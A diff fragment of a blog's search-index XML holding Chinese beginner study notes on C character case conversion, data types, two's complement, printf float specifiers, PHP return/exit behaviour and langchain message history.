ch2);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h2 id="使用标准库函数-tolower-和-toupper"><a href="#使用标准库函数-tolower-和-toupper" class="headerlink" title="使用标准库函数 tolower() 和 toupper()"></a>使用标准库函数 <code>tolower()</code> 和 <code>toupper()</code></h2><ul>
-<li><strong>原理</strong>：C 语言的标准库 <code>&lt;ctype.h&gt;</code> 提供了 <code>tolower()</code> 和 <code>toupper()</code> 函数来进行字符大小写转换。<code>tolower()</code> 函数会将给定的字符转换为小写形式（如果该字符是大写字母 ），<code>toupper()</code> 函数会将给定的字符转换为大写形式（如果该字符是小写字母 ）。如果字符本身不是字母，函数会直接返回原字符。</li>
-<li><strong>代码示例</strong>：</li>
-</ul>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> ch = <span class="string">&#x27;A&#x27;</span>;</span><br><span class="line">    <span class="comment">// 大写转小写</span></span><br><span class="line">    ch = <span class="built_in">tolower</span>(ch);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;转换后的字符: %c\n&quot;</span>, ch);</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> ch2 = <span class="string">&#x27;b&#x27;</span>;</span><br><span class="line">    <span class="comment">// 小写转大写</span></span><br><span class="line">    ch2 = <span class="built_in">toupper</span>(ch2);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;转换后的字符: %c\n&quot;</span>, ch2);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h2 id="对字符串中的字符进行大小写转换"><a href="#对字符串中的字符进行大小写转换" class="headerlink" title="对字符串中的字符进行大小写转换"></a>对字符串中的字符进行大小写转换</h2><p>如果要对字符串中的所有字符进行大小写转换，可以结合循环和上述方法来实现。</p>
-<ul>
-<li><strong>利用 ASCII 码值差值的示例</strong>：</li>
-</ul>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> str[<span class="number">100</span>] = <span class="string">&quot;Hello World&quot;</span>;</span><br><span class="line">    <span class="type">int</span> len = <span class="built_in">strlen</span>(str);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (str[i] &gt;= <span class="string">&#x27;A&#x27;</span> &amp;&amp; str[i] &lt;= <span class="string">&#x27;Z&#x27;</span>) &#123;</span><br><span class="line">            str[i] = str[i] + <span class="number">32</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (str[i] &gt;= <span class="string">&#x27;a&#x27;</span> &amp;&amp; str[i] &lt;= <span class="string">&#x27;z&#x27;</span>) &#123;</span><br><span class="line">            str[i] = str[i] - <span class="number">32</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;转换后的字符串: %s\n&quot;</span>, str);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li><strong>利用标准库函数的示例</strong>：</li>
-</ul>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> str[<span class="number">100</span>] = <span class="string">&quot;Hello World&quot;</span>;</span><br><span class="line">    <span class="type">int</span> len = <span class="built_in">strlen</span>(str);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">isupper</span>(str[i])) &#123;</span><br><span class="line">            str[i] = <span class="built_in">tolower</span>(str[i]);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">islower</span>(str[i])) &#123;</span><br><span class="line">            str[i] = <span class="built_in">toupper</span>(str[i]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;转换后的字符串: %s\n&quot;</span>, str);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-]]></content>
-      <categories>
-        <category>c语言</category>
-      </categories>
-      <tags>
-        <tag>计算机二级</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>c语言数值类型与字长的理解</title>
-    <url>/2025/01/17/c%E8%AF%AD%E8%A8%80%E6%95%B0%E5%80%BC%E7%B1%BB%E5%9E%8B%E4%B8%8E%E5%AD%97%E9%95%BF%E7%9A%84%E7%90%86%E8%A7%A3/</url>
-    <content><![CDATA[<h2 id="c语言数据类型"><a href="#c语言数据类型" class="headerlink" title="c语言数据类型"></a>c语言数据类型</h2><h3 id="数据声明与字长"><a href="#数据声明与字长" class="headerlink" title="数据声明与字长"></a>数据声明与字长</h3><p>1.首先字长是计算机可以处理的二进制数的位数,字节是基本单位,一字节等于8位,1位是0或1。</p>
-<p>2.关于int,short,long,long long , unsigned声明与可处理二进制数位数的关系:</p>
-<p><strong>首先提醒:</strong></p>
-<p>如-3：可以表示为,10000011,其中最左边的那个数所在的位置叫<strong>符号位</strong>,在没有声明为unsigned的情况下,符号位默认为最左边那位二进制数所占位置,若有unsigned,则不存在符号位。</p>
-<p>eg:以64位计算机为例,int处理数据并将其转化为二进制数,为32位的二进制数,而long long 为至少为64位二进制数表示的数字<br>我的意思就是，如果拿应该给long声明处理的超大数据,在printf时使用%d占位符,不用%ld占位符,就会使这个数据被截断,即截断前32位表示成10进制数后输出,不能通过完整的64位二进制数转化位十进制数后输出</p>
-<p>3.当然%d可以完整输出的数据,用%ld也可以完整输出,没问题的</p>
-<h3 id="源码反码和补码"><a href="#源码反码和补码" class="headerlink" title="源码反码和补码"></a>源码反码和补码</h3><p>1.首先,我们说说,int表示的最大正数数&#x2F;最小负数是多少,(64位操作系统的情况下)根据二进制和十进制的转换:</p>
-<p>正数的范围：最大的正数是符号位为0，其余位全为1的情况。对于 32 位的int，最大正数的二进制表示为01111111 11111111 11111111 11111111。</p>
-<p>如下图:</p>
-<img src="/2025/01/17/c%E8%AF%AD%E8%A8%80%E6%95%B0%E5%80%BC%E7%B1%BB%E5%9E%8B%E4%B8%8E%E5%AD%97%E9%95%BF%E7%9A%84%E7%90%86%E8%A7%A3/image-20250117120319919-1737086604130-1.png" class="" title="image-20250117120319919">
-
-<p>对于有unsigned前缀声明的变量,没有符号位,32位都是二进制,所以直接2的32次幂。<br>所以最大整数就是:</p>
-<img src="/2025/01/17/c%E8%AF%AD%E8%A8%80%E6%95%B0%E5%80%BC%E7%B1%BB%E5%9E%8B%E4%B8%8E%E5%AD%97%E9%95%BF%E7%9A%84%E7%90%86%E8%A7%A3/image-20250117151232436.png" class="" title="image-20250117151232436">
-
-<p>2.有关源码反码和补码<br>为了计算的方便,诞生了这个概念:<br>计算:<br>5-3&#x3D;2,在计算机内被转化为:<br>5+(-3)&#x3D;2<br>可能有些抽象,我先来定义一下这几个概念:</p>
-<img src="/2025/01/17/c%E8%AF%AD%E8%A8%80%E6%95%B0%E5%80%BC%E7%B1%BB%E5%9E%8B%E4%B8%8E%E5%AD%97%E9%95%BF%E7%9A%84%E7%90%86%E8%A7%A3/image-20250117151607539.png" class="" title="image-20250117151607539">
-
-<img src="/2025/01/17/c%E8%AF%AD%E8%A8%80%E6%95%B0%E5%80%BC%E7%B1%BB%E5%9E%8B%E4%B8%8E%E5%AD%97%E9%95%BF%E7%9A%84%E7%90%86%E8%A7%A3/image-20250117151620652.png" class="" title="image-20250117151620652">
-
-<p>在计算方面:</p>
-<p>5-3的计算,就相当于5的二进制数加上3的二进制数的补码,可以化减法为加法</p>
-<img src="/2025/01/17/c%E8%AF%AD%E8%A8%80%E6%95%B0%E5%80%BC%E7%B1%BB%E5%9E%8B%E4%B8%8E%E5%AD%97%E9%95%BF%E7%9A%84%E7%90%86%E8%A7%A3/image-20250117152207888.png" class="" title="image-20250117152207888">
-
-<h2 id="可移植类型-和"><a href="#可移植类型-和" class="headerlink" title="可移植类型:&lt;stdint.h&gt;和&lt;inttypes.h&gt;"></a>可移植类型:&lt;stdint.h&gt;和&lt;inttypes.h&gt;</h2><p>详细说明,见C prime plus教材48页<br><strong>这里进行补充:</strong></p>
-<p>1.这两种库的区别:</p>
-<img src="/2025/01/17/c%E8%AF%AD%E8%A8%80%E6%95%B0%E5%80%BC%E7%B1%BB%E5%9E%8B%E4%B8%8E%E5%AD%97%E9%95%BF%E7%9A%84%E7%90%86%E8%A7%A3/image-20250122120246573.png" class="" title="image-20250122120246573">
-
-<p>2.输出宏和占位符的区别:</p>
-<img src="/2025/01/17/c%E8%AF%AD%E8%A8%80%E6%95%B0%E5%80%BC%E7%B1%BB%E5%9E%8B%E4%B8%8E%E5%AD%97%E9%95%BF%E7%9A%84%E7%90%86%E8%A7%A3/image-20250122120353682.png" class="" title="image-20250122120353682">
-
-<h2 id="浮点数后缀解释"><a href="#浮点数后缀解释" class="headerlink" title="浮点数后缀解释"></a>浮点数后缀解释</h2><p>是的，正如你所理解的那样。如果你声明一个 <code>float</code> 类型的变量并给它赋一个没有加后缀 <code>f</code> 的浮点数（比如 <code>11.0</code>），那么这个数会被默认当作 <code>double</code> 类型来处理，而不是 <code>float</code>。这种情况下，虽然你声明的是 <code>float</code> 类型的变量，但浮点常量（比如 <code>11.0</code>）默认是 <code>double</code> 类型，所以在赋值时会发生隐式转换，将 <code>double</code> 转换为 <code>float</code>。</p>
-<h3 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h3><ul>
-<li><p><strong>没有 <code>f</code> 后缀时</strong>：<code>11.0</code> 被当作 <code>double</code> 类型。赋值给 <code>float</code> 类型变量时会发生类型转换（从 <code>double</code> 转为 <code>float</code>），这个过程中可能会有精度丢失，因为 <code>float</code> 的精度比 <code>double</code> 要低。</p>
-</li>
-<li><p><strong>加上 <code>f</code> 后缀时</strong>：<code>11.0f</code> 被明确当作 <code>float</code> 类型，直接赋值给 <code>float</code> 类型的变量时，没有类型转换，避免了精度损失。</p>
-</li>
-</ul>
-<h3 id="内存处理："><a href="#内存处理：" class="headerlink" title="内存处理："></a>内存处理：</h3><ul>
-<li>在内存中，<code>double</code> 类型的数据通常占 8 字节，而 <code>float</code> 类型占 4 字节。所以如果你不加 <code>f</code> 后缀，虽然变量是 <code>float</code>，但是你给它赋的 <code>double</code> 数值会先被存储为 <code>double</code>，然后再强制转换为 <code>float</code> 存储，可能会丢失一些精度。</li>
-</ul>
-<h3 id="举个例子："><a href="#举个例子：" class="headerlink" title="举个例子："></a>举个例子：</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">float</span> f_num = <span class="number">11.0</span>;     <span class="comment">// 11.0 默认是 double 类型</span></span><br><span class="line">    <span class="type">float</span> f_num_with_f = <span class="number">11.0f</span>;  <span class="comment">// 明确指定为 float 类型</span></span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;f_num: %.6f\n&quot;</span>, f_num);  <span class="comment">// 打印 float 类型的 f_num</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;f_num_with_f: %.6f\n&quot;</span>, f_num_with_f);  <span class="comment">// 打印明确指定为 float 的 f_num_with_f</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h3 id="结论："><a href="#结论：" class="headerlink" title="结论："></a>结论：</h3><ul>
-<li><strong>没有 <code>f</code> 后缀</strong>：浮点常量 <code>11.0</code> 会被视为 <code>double</code> 类型，赋值给 <code>float</code> 类型时会进行类型转换。</li>
-<li><strong>加上 <code>f</code> 后缀</strong>：常量被明确作为 <code>float</code> 类型，避免了隐式转换。</li>
-</ul>
-<p>这样，当你希望显式控制数据的类型时，加上后缀 <code>f</code> 是非常重要的，特别是在性能要求较高或精度敏感的场合。</p>
-<p>补充:</p>
-<p>你可以通过统一声明为 <code>float</code> 类型，并加上 <code>f</code> 后缀来控制常量的类型，这样可以避免隐式类型转换时造成的精度损失。</p>
-<p>然而，是否选择 <code>float</code> 作为默认类型，需要根据你的实际需求来判断。如果需要更高的精度，<code>double</code> 可能会是更好的选择，因为它的精度更高且范围更大。</p>
-<h2 id="转换说明-转换字符"><a href="#转换说明-转换字符" class="headerlink" title="转换说明(%转换字符)"></a>转换说明(%转换字符)</h2><p>在 C 语言中，浮点数的转换说明符（也叫转换字符）用于格式化 <code>float</code>、<code>double</code> 和 <code>long double</code> 类型的数据。以下是与浮点数相关的常见转换说明符：</p>
-<hr>
-<h3 id="1-f：标准浮点数表示"><a href="#1-f：标准浮点数表示" class="headerlink" title="1. %f：标准浮点数表示"></a>1. <strong><code>%f</code></strong>：标准浮点数表示</h3><ul>
-<li>用于以小数点形式显示浮点数。</li>
-<li>默认保留 6 位小数，可通过指定精度改变小数位数。</li>
-</ul>
-<h4 id="示例："><a href="#示例：" class="headerlink" title="示例："></a>示例：</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">float</span> f = <span class="number">3.14159</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%f\n&quot;</span>, f);  <span class="comment">// 输出：3.141590</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%.2f\n&quot;</span>, f); <span class="comment">// 输出：3.14（保留两位小数）</span></span><br></pre></td></tr></table></figure>
-
-<hr>
-<h3 id="2-e-或-E：科学计数法表示"><a href="#2-e-或-E：科学计数法表示" class="headerlink" title="2. %e 或 %E：科学计数法表示"></a>2. <strong><code>%e</code> 或 <code>%E</code></strong>：科学计数法表示</h3><ul>
-<li>用于以科学计数法（指数形式）表示浮点数。</li>
-<li><code>%e</code> 使用小写 <code>e</code> 表示指数，<code>%E</code> 使用大写 <code>E</code> 表示指数。</li>
-</ul>
-<h4 id="示例：-1"><a href="#示例：-1" class="headerlink" title="示例："></a>示例：</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">double</span> d = <span class="number">12345.6789</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%e\n&quot;</span>, d);  <span class="comment">// 输出：1.234568e+04</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%E\n&quot;</span>, d);  <span class="comment">// 输出：1.234568E+04</span></span><br></pre></td></tr></table></figure>
-
-<hr>
-<h3 id="3-g-或-G：自动选择简洁表示"><a href="#3-g-或-G：自动选择简洁表示" class="headerlink" title="3. %g 或 %G：自动选择简洁表示"></a>3. <strong><code>%g</code> 或 <code>%G</code></strong>：自动选择简洁表示</h3><ul>
-<li>自动在 <code>%f</code> 和 <code>%e</code> 之间选择最简洁的表示形式。</li>
-<li><code>%g</code> 使用小写 <code>e</code>，<code>%G</code> 使用大写 <code>E</code>（当选择科学计数法时）。</li>
-</ul>
-<h4 id="示例：-2"><a href="#示例：-2" class="headerlink" title="示例："></a>示例：</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">double</span> d = <span class="number">0.000123456</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%g\n&quot;</span>, d);  <span class="comment">// 输出：0.000123456（普通形式）</span></span><br><span class="line">d = <span class="number">123456.789</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%g\n&quot;</span>, d);  <span class="comment">// 输出：1.23457e+05（科学计数法）</span></span><br></pre></td></tr></table></figure>
-
-<hr>
-<h3 id="4-a-或-A：十六进制浮点数表示（C99-标准引入）"><a href="#4-a-或-A：十六进制浮点数表示（C99-标准引入）" class="headerlink" title="4. %a 或 %A：十六进制浮点数表示（C99 标准引入）"></a>4. <strong><code>%a</code> 或 <code>%A</code></strong>：十六进制浮点数表示（C99 标准引入）</h3><ul>
-<li>用于以十六进制表示浮点数，指数以 <code>p</code> 或 <code>P</code> 表示（表示 2 的幂次）。</li>
-<li><code>%a</code> 使用小写字母，<code>%A</code> 使用大写字母。</li>
-</ul>
-<h4 id="示例：-3"><a href="#示例：-3" class="headerlink" title="示例："></a>示例：</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">double</span> d = <span class="number">123.456</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%a\n&quot;</span>, d);  <span class="comment">// 输出：0x1.edd2f1a9fbe77p+6</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%A\n&quot;</span>, d);  <span class="comment">// 输出：0X1.EDD2F1A9FBE77P+6</span></span><br></pre></td></tr></table></figure>
-
-<hr>
-<h3 id="5-Lf、-Le、-Lg：用于-long-double"><a href="#5-Lf、-Le、-Lg：用于-long-double" class="headerlink" title="5. %Lf、%Le、%Lg：用于 long double"></a>5. <strong><code>%Lf</code>、<code>%Le</code>、<code>%Lg</code></strong>：用于 <code>long double</code></h3><ul>
-<li>当处理 <code>long double</code> 类型时，需要在标准说明符前加 <code>L</code> 前缀。<ul>
-<li><code>%Lf</code>：以小数点形式输出 <code>long double</code>。</li>
-<li><code>%Le</code>：以科学计数法输出 <code>long double</code>。</li>
-<li><code>%Lg</code>：以最简洁的形式输出 <code>long double</code>。</li>
-</ul>
-</li>
-</ul>
-<h4 id="示例：-4"><a href="#示例：-4" class="headerlink" title="示例："></a>示例：</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">long</span> <span class="type">double</span> ld = <span class="number">3.141592653589793238L</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%Lf\n&quot;</span>, ld);  <span class="comment">// 输出 long double 的值</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%Le\n&quot;</span>, ld);  <span class="comment">// 科学计数法表示</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%Lg\n&quot;</span>, ld);  <span class="comment">// 自动选择简洁表示</span></span><br></pre></td></tr></table></figure>
-
-<hr>
-<h3 id="6-宽度与精度控制"><a href="#6-宽度与精度控制" class="headerlink" title="6. 宽度与精度控制"></a>6. <strong>宽度与精度控制</strong></h3><p>可以通过格式说明符进一步控制输出的宽度和精度：</p>
-<ul>
-<li><strong><code>%m.nf</code></strong>：指定总宽度 <code>m</code> 和小数部分的位数 <code>n</code>。<ul>
-<li><code>m</code>：整个数值占的最小宽度，不足时补空格。</li>
-<li><code>n</code>：小数部分的位数。</li>
-</ul>
-</li>
-</ul>
-<h4 id="示例：-5"><a href="#示例：-5" class="headerlink" title="示例："></a>示例：</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">double</span> d = <span class="number">123.456</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%10.2f\n&quot;</span>, d);  <span class="comment">// 输出：    123.46（宽度 10，保留两位小数）</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%-10.2f\n&quot;</span>, d); <span class="comment">// 输出：123.46    （左对齐，宽度 10）</span></span><br></pre></td></tr></table></figure>
-
-<hr>
-<h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><table>
-<thead>
-<tr>
-<th>转换字符</th>
-<th align="left">含义</th>
-</tr>
-</thead>
-<tbody><tr>
-<td><code>%f</code></td>
-<td align="left">按小数点形式输出浮点数</td>
-</tr>
-<tr>
-<td><code>%e</code>&#x2F;<code>%E</code></td>
-<td align="left">按科学计数法输出浮点数</td>
-</tr>
-<tr>
-<td><code>%g</code>&#x2F;<code>%G</code></td>
-<td align="left">自动选择 <code>%f</code> 或 <code>%e</code> 的简洁形式</td>
-</tr>
-<tr>
-<td><code>%a</code>&#x2F;<code>%A</code></td>
-<td align="left">按十六进制表示浮点数（C99）</td>
-</tr>
-<tr>
-<td><code>%Lf</code></td>
-<td align="left">以小数点形式输出 <code>long double</code></td>
-</tr>
-<tr>
-<td><code>%Le</code></td>
-<td align="left">以科学计数法输出 <code>long double</code></td>
-</tr>
-<tr>
-<td><code>%Lg</code></td>
-<td align="left">以最简洁形式输出 <code>long double</code></td>
-</tr>
-<tr>
-<td><code>%o</code></td>
-<td align="left">输出整数的八进制形式</td>
-</tr>
-<tr>
-<td><code>%#o</code></td>
-<td align="left">输出带有<code>0</code>前缀的八进制形式</td>
-</tr>
-<tr>
-<td>根据需要选择合适的格式化符来输出浮点数。</td>
-<td align="left"></td>
-</tr>
-<tr>
-<td>注意:float和double都是用%e或%E直接表示科学计数法形式</td>
-<td align="left"></td>
-</tr>
-</tbody></table>
-]]></content>
-      <categories>
-        <category>c语言</category>
-      </categories>
-      <tags>
-        <tag>c语言数据类型</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>c语言标准库及其函数</title>
     <url>/2025/03/24/c%E8%AF%AD%E8%A8%80%E6%A0%87%E5%87%86%E5%BA%93%E5%8F%8A%E5%85%B6%E5%87%BD%E6%95%B0/</url>
     <content><![CDATA[<h1 id=""><a href="#" class="headerlink" title="&lt;stdio.h&gt;"></a>&lt;stdio.h&gt;</h1><h2 id="scanf-函数"><a href="#scanf-函数" class="headerlink" title="scanf()函数"></a><code>scanf()</code>函数</h2><h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><ul>
@@ -1371,34 +1371,6 @@ void main()
     <content><![CDATA[]]></content>
   </entry>
   <entry>
-    <title>if代码执行机制</title>
-    <url>/2025/01/14/if%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%9C%BA%E5%88%B6/</url>
-    <content><![CDATA[<h3 id="这里我们总结if代码块中布尔值的多少对程序进程的影响"><a href="#这里我们总结if代码块中布尔值的多少对程序进程的影响" class="headerlink" title="这里我们总结if代码块中布尔值的多少对程序进程的影响"></a>这里我们总结if代码块中布尔值的多少对程序进程的影响</h3><h4 id="if条件小括号内的情况"><a href="#if条件小括号内的情况" class="headerlink" title="if条件小括号内的情况"></a>if条件小括号内的情况</h4><h5 id="if括号内为false"><a href="#if括号内为false" class="headerlink" title="if括号内为false"></a>if括号内为false</h5><p>毫无疑问,if代码块里面的代码不会继续运行,此时整个程序会跳过条件括号里为false的这个if代码块继续往下运行。</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="literal">false</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;This will not be printed&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;This will be printed because the if condition was false&quot;</span>;</span><br></pre></td></tr></table></figure>
-<p>在上述代码中，因为 if 条件为 false，echo “This will not be printed”; 不会被执行，程序直接执行 echo “This will be printed because the if condition was false”。</p>
-<h5 id="if括号里为true"><a href="#if括号里为true" class="headerlink" title="if括号里为true"></a>if括号里为true</h5><p>当 if 括号内条件为 true 时，if 代码块内的代码会执行。但这并不意味着整个程序会不受影响地继续运行。<br>取决于 if 代码块内的代码：<br>如果 if 代码块内有 return、exit 或 die 等终止程序或函数的语句，程序或函数的执行会被终止。<br>比如:</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">exampleFunction</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;This will be printed&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;This will not be printed because of the return statement&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">exampleFunction</span>();</span><br></pre></td></tr></table></figure>
-<p>在这种情况下,if代码块内因为有return,所以在同一函数代码空间的echo语句不会被执行。也就是在这一层代码空间内，程序的运行确实被终止了。<br>这就引出了我们接下来要说的一种情况:</p>
-<h4 id="return的辨析"><a href="#return的辨析" class="headerlink" title="return的辨析"></a>return的辨析</h4><p>其实我们在这里可以把return,die,exit这几个对程序运行都有影响的一起说了。<br>1.首先是return，它在,不管是返回什么布尔值,都会使<strong>同一空间代码</strong>停止运行,<br>如果在函数内,它就会使return之后的代码无法运行,如果在类中,也是一样，而我们不推荐把它放在全局代码空间中,这样会使得整个程序停止运行。<br>例如:</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">exampleFunction</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Before return&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="comment">// 这里的条件可以根据需要修改</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;After return&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">exampleFunction</span>();</span><br></pre></td></tr></table></figure>
-<p>在函数外依然可以调用这个函数,函数外并没有因为前面函数里面有return而被打断,但是这里就只会<br>输出:Before return,不会输出After return<br>在类,即对象class里面情况类似</p>
-<p>在文件包含的情况下:<br>在被包含文件:”included_file.php”内:</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Before return in included file&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;After return in included file&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>再在另外一个文件中包含它:</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;included_file.php&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;This is after including the file&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>只会输出:</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Before return in included file</span><br><span class="line">This is after including the file</span><br></pre></td></tr></table></figure>
-<p>即:在被包含文件自己代码中,return后面的After return in included file没有输出，程序终止。<br>但是并没有影响去包含这个文件的主文件在后方的”This is after including the file”这句话的输出,<br>所以在文件包含的情景下,return也只会终止自己文件后方的代码，对主文件没有影响。</p>
-<p>2.而die,exit则会直接使整个程序不可运行,没有代码空间的说法。</p>
-]]></content>
-      <categories>
-        <category>php</category>
-      </categories>
-      <tags>
-        <tag>php条件函数</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>json学习</title>
     <url>/2025/03/07/json%E5%AD%A6%E4%B9%A0/</url>
     <content><![CDATA[<h1 id="json库学习"><a href="#json库学习" class="headerlink" title="json库学习"></a>json库学习</h1><h2 id="转码为dict格式文件"><a href="#转码为dict格式文件" class="headerlink" title="转码为dict格式文件"></a>转码为dict格式文件</h2><ul>
@@ -1435,61 +1407,6 @@ void main()
       </categories>
       <tags>
         <tag>json库</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>linux基础</title>
-    <url>/2025/01/11/linux%E5%9F%BA%E7%A1%80/</url>
-    <content><![CDATA[]]></content>
-      <categories>
-        <category>Linux</category>
-      </categories>
-      <tags>
-        <tag>基本符号</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>langchain历史记录管理</title>
-    <url>/2025/02/20/langchain%E5%8E%86%E5%8F%B2%E8%AE%B0%E5%BD%95%E7%AE%A1%E7%90%86/</url>
-    <content><![CDATA[<h1 id="langchain历史记录管理"><a href="#langchain历史记录管理" class="headerlink" title="langchain历史记录管理"></a>langchain历史记录管理</h1><h2 id="输入的消息类型"><a href="#输入的消息类型" class="headerlink" title="输入的消息类型:"></a>输入的消息类型:</h2><ul>
-<li><p>关于Message的基本介绍可用看这:<a href="https://python.langchain.com.cn/docs/modules/model_io/models/chat/">langchain基本Messages</a></p>
-</li>
-<li><p>这里说说基本的用法(重在区别BaseMessage,HumanMessage,AIMessage)</p>
-</li>
-<li><ul>
-<li><p>如以下代码:</p>
-</li>
